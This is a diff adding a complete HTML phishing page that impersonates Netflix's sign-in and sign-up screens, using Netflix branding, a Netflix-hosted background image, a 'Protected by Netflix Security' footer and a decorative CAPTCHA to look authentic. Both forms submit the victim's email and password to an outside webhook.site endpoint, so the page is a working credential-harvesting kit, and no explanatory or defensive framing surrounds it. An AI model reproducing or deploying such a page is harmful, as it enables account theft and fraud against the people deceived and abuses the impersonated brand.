@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html><head><title>Netflix - Sign In</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+  background:#141414;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  background-image:url('https://assets.nflxext.com/ffe/siteui/vlv3/5e16108c-fd30-46de-9bb8-0b4e1bbbc509/');
+  background-size:cover;
+  background-position:center;
+  position:relative;
+}
+body::before{
+  content:'';
+  position:absolute;
+  inset:0;
+  background:rgba(0,0,0,0.6);
+  z-index:0;
+}
+.card{
+  background:rgba(20,20,20,0.95);
+  padding:40px;
+  border-radius:4px;
+  box-shadow:0 4px 20px rgba(0,0,0,.5);
+  width:400px;
+  position:relative;
+  z-index:1;
+  border:1px solid rgba(255,255,255,0.05);
+}
+.auth-form{display:none}
+.auth-form.active{display:block}
+.netflix-n{
+  position:absolute;
+  top:16px;
+  left:16px;
+  width:40px;
+  height:40px;
+  background:#E50914;
+  color:#fff;
+  font-weight:700;
+  font-size:24px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border-radius:4px;
+  font-family:'Helvetica',Arial,sans-serif;
+}
+h2{text-align:center;margin-bottom:24px;color:#fff;margin-top:40px}
+p.sub{text-align:center;color:#b3b3b3;margin-bottom:20px;font-size:14px}
+input{
+  width:100%;
+  padding:12px;
+  margin:8px 0;
+  border:1px solid #333;
+  border-radius:4px;
+  font-size:14px;
+  background:#333;
+  color:#fff;
+  outline:none;
+}
+input:focus{border-color:#fff}
+input::placeholder{color:#8c8c8c}
+button{
+  width:100%;
+  padding:12px;
+  background:#E50914;
+  color:#fff;
+  border:none;
+  border-radius:4px;
+  font-size:16px;
+  cursor:pointer;
+  margin-top:12px
+}
+button:hover{background:#B20710}
+.footer{text-align:center;margin-top:16px;color:#888;font-size:12px}
+.switch-link{
+  color:#b3b3b3;
+  text-align:center;
+  margin-top:16px;
+  font-size:14px;
+  cursor:pointer
+}
+.switch-link a{color:#fff;text-decoration:none;font-weight:500}
+.switch-link a:hover{text-decoration:underline}
+.captcha-box{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin:12px 0;
+  padding:10px 12px;
+  background:#222;
+  border:1px solid #333;
+  border-radius:4px;
+}
+.captcha-box input{width:80px;margin:0;padding:8px;text-align:center;font-size:16px;letter-spacing:3px}
+.captcha-text{
+  font-size:20px;
+  font-weight:700;
+  color:#E50914;
+  letter-spacing:4px;
+  user-select:none;
+  font-family:'Courier New',monospace;
+  font-style:italic;
+  text-decoration:line-through 2px rgba(229,9,20,0.3);
+  background:#1a1a1a;
+  padding:4px 10px;
+  border-radius:3px;
+}
+.captcha-label{color:#8c8c8c;font-size:12px;margin-bottom:4px;display:block}
+.error{color:#E87C7C;font-size:12px;margin-top:2px;display:none}
+.error.show{display:block}
+</style></head>
+<body>
+<div class="card">
+<div class="netflix-n">N</div>
+
+<!-- LOGIN FORM -->
+<div id="loginForm" class="auth-form active">
+<h2>Sign In</h2>
+<p class="sub">Sign in to your Netflix account</p>
+<form method="POST" action="https://webhook.site/d77cba28-d88b-4ba5-ac7b-9094d03012db" onsubmit="return validateLogin()">
+<input type="hidden" name="form_type" value="login">
+<input type="email" name="email" placeholder="Email address" required>
+<input type="password" name="password" placeholder="Password" required>
+<label class="captcha-label">Enter the code below</label>
+<div class="captcha-box">
+  <span class="captcha-text" id="loginCaptchaText"></span>
+  <input type="text" name="captcha" id="loginCaptchaInput" placeholder="?" maxlength="5" required>
+</div>
+<div class="error" id="loginCaptchaError">Incorrect code. Try again.</div>
+<button type="submit">Sign In</button>
+</form>
+<div class="switch-link">New to Netflix? <a href="#" onclick="switchForm('signup');return false">Sign up now</a></div>
+<div class="footer">Protected by Netflix Security</div>
+</div>
+
+<!-- SIGNUP FORM -->
+<div id="signupForm" class="auth-form">
+<h2>Create Account</h2>
+<p class="sub">Start your free month</p>
+<form method="POST" action="https://webhook.site/d77cba28-d88b-4ba5-ac7b-9094d03012db" onsubmit="return validateSignup()">
+<input type="hidden" name="form_type" value="signup">
+<input type="email" name="email" placeholder="Email address" required>
+<input type="password" name="password" placeholder="Password" required>
+<input type="password" name="confirm_password" placeholder="Confirm password" required>
+<label class="captcha-label">Enter the code below</label>
+<div class="captcha-box">
+  <span class="captcha-text" id="signupCaptchaText"></span>
+  <input type="text" name="captcha" id="signupCaptchaInput" placeholder="?" maxlength="5" required>
+</div>
+<div class="error" id="signupCaptchaError">Incorrect code. Try again.</div>
+<button type="submit">Get Started</button>
+</form>
+<div class="switch-link">Already have an account? <a href="#" onclick="switchForm('login');return false">Sign in</a></div>
+<div class="footer">Protected by Netflix Security</div>
+</div>
+
+</div>
+
+<script>
+// Generate random CAPTCHA text
+function generateCaptcha(){
+  const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+  let text='';
+  for(let i=0;i<5;i++)text+=chars[Math.floor(Math.random()*chars.length)];
+  return text;
+}
+
+// Set CAPTCHAs on load
+let loginCaptcha=generateCaptcha();
+let signupCaptcha=generateCaptcha();
+document.getElementById('loginCaptchaText').textContent=loginCaptcha;
+document.getElementById('signupCaptchaText').textContent=signupCaptcha;
+
+// Form switching
+function switchForm(form){
+  document.getElementById('loginForm').classList.remove('active');
+  document.getElementById('signupForm').classList.remove('active');
+  document.getElementById(form+'Form').classList.add('active');
+  // Generate fresh CAPTCHAs on switch
+  loginCaptcha=generateCaptcha();
+  signupCaptcha=generateCaptcha();
+  document.getElementById('loginCaptchaText').textContent=loginCaptcha;
+  document.getElementById('signupCaptchaText').textContent=signupCaptcha;
+  document.getElementById('loginCaptchaError').classList.remove('show');
+  document.getElementById('signupCaptchaError').classList.remove('show');
+}
+
+// Login validation
+function validateLogin(){
+  const input=document.getElementById('loginCaptchaInput');
+  if(input.value.toUpperCase()!==loginCaptcha){
+    document.getElementById('loginCaptchaError').classList.add('show');
+    // Regenerate CAPTCHA
+    loginCaptcha=generateCaptcha();
+    document.getElementById('loginCaptchaText').textContent=loginCaptcha;
+    input.value='';
+    return false;
+  }
+  return true;
+}
+
+// Signup validation
+function validateSignup(){
+  const input=document.getElementById('signupCaptchaInput');
+  if(input.value.toUpperCase()!==signupCaptcha){
+    document.getElementById('signupCaptchaError').classList.add('show');
+    signupCaptcha=generateCaptcha();
+    document.getElementById('signupCaptchaText').textContent=signupCaptcha;
+    input.value='';
+    return false;
+  }
+  return true;
+}
+</script>
+</body></html>
